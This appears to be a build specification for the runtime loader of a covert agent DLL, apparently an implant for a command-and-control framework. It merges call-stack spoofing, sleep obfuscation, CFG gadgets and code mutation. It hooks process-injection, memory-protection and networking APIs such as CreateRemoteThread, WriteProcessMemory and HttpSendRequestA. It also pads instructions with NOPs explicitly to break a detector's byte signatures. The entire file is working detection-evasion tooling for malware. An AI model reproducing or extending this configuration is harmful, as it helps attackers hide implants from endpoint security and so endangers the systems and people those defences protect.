# AB Kit PICO — runtime hooks for the loaded agent DLL.
#
# spoof_worker_thread: worker-thread proxy (main spoof backend)
# wininet_gate: CET-safe stitch proxy for WinInet calls (hooks_iat_wingate)
x64:
    load "bin/pico.x64.o"
        make object +shatter +mutate

    load "bin/spoof_worker_thread.x64.o"
        merge

    load "bin/wininet_gate.x64.o"
        merge
    load "bin/stitch_stub.x64.bin"
        link "stitchcode"

    load "bin/hooks.x64.o"
        merge

    load "bin/cfg_gadgets.x64.o"
        merge

    load "bin/sleep_kraken_adv.x64.o"
        merge

    load "bin/cleanup.x64.o"
        merge

    load "bin/crt.x64.o"
        merge

    exportfunc "setup_hooks"     "__tag_setup_hooks"
    exportfunc "setup_memory"    "__tag_setup_memory"
    exportfunc "patch_dispatch"  "__tag_patch_dispatch"

    mergelib "libtcg.x64.zip"

    # IAT hooks — WININET (routed through wininet_gate_call)
    addhook "WININET$HttpSendRequestA"     "_HttpSendRequestA"
    addhook "WININET$InternetOpenA"        "_InternetOpenA"
    addhook "WININET$InternetConnectA"     "_InternetConnectA"

    # IAT hooks — WS2_32
    addhook "WS2_32$WSAStartup"            "_WSAStartup"
    addhook "WS2_32$WSASocketA"            "_WSASocketA"

    # IAT hooks — KERNEL32
    addhook "KERNEL32$CloseHandle"         "_CloseHandle"
    addhook "KERNEL32$CreateFileMappingA"  "_CreateFileMappingA"
    addhook "KERNEL32$CreateProcessA"      "_CreateProcessA"
    addhook "KERNEL32$CreateRemoteThread"  "_CreateRemoteThread"
    addhook "KERNEL32$CreateThread"        "_CreateThread"
    addhook "KERNEL32$DuplicateHandle"     "_DuplicateHandle"
    addhook "KERNEL32$ExitThread"          "_ExitThread"
    addhook "KERNEL32$GetThreadContext"    "_GetThreadContext"
    addhook "KERNEL32$HeapAlloc"           "_HeapAlloc"
    addhook "KERNEL32$HeapReAlloc"         "_HeapReAlloc"
    addhook "KERNEL32$HeapFree"            "_HeapFree"
    addhook "KERNEL32$LoadLibraryA"        "_LoadLibraryA"
    addhook "KERNEL32$MapViewOfFile"       "_MapViewOfFile"
    addhook "KERNEL32$OpenProcess"         "_OpenProcess"
    addhook "KERNEL32$OpenThread"          "_OpenThread"
    addhook "KERNEL32$ReadProcessMemory"   "_ReadProcessMemory"
    addhook "KERNEL32$ResumeThread"        "_ResumeThread"
    addhook "KERNEL32$SetThreadContext"    "_SetThreadContext"
    addhook "KERNEL32$Sleep"               "_KrakenSleep"
    addhook "KERNEL32$WaitForSingleObject" "_WaitForSingleObject"
    addhook "KERNEL32$UnmapViewOfFile"     "_UnmapViewOfFile"
    addhook "KERNEL32$VirtualAlloc"        "_VirtualAlloc"
    addhook "KERNEL32$VirtualAllocEx"      "_VirtualAllocEx"
    addhook "KERNEL32$VirtualFree"         "_VirtualFree"
    addhook "KERNEL32$VirtualProtect"      "_VirtualProtect"
    addhook "KERNEL32$VirtualProtectEx"    "_VirtualProtectEx"
    addhook "KERNEL32$VirtualQuery"        "_VirtualQuery"
    addhook "KERNEL32$WriteProcessMemory"  "_WriteProcessMemory"

    # IAT hooks — OLE32
    addhook "OLE32$CoCreateInstance"       "_CoCreateInstance"

    # Break CristalLoaders prologue/epilogue byte signatures
    pack $NOP "b" 0x90
    ised insert "PUSH r64" "SUB r/m64, imm8" $NOP +before
    ised insert "POP r64"  "CALL r/m64"      $NOP +before

    export
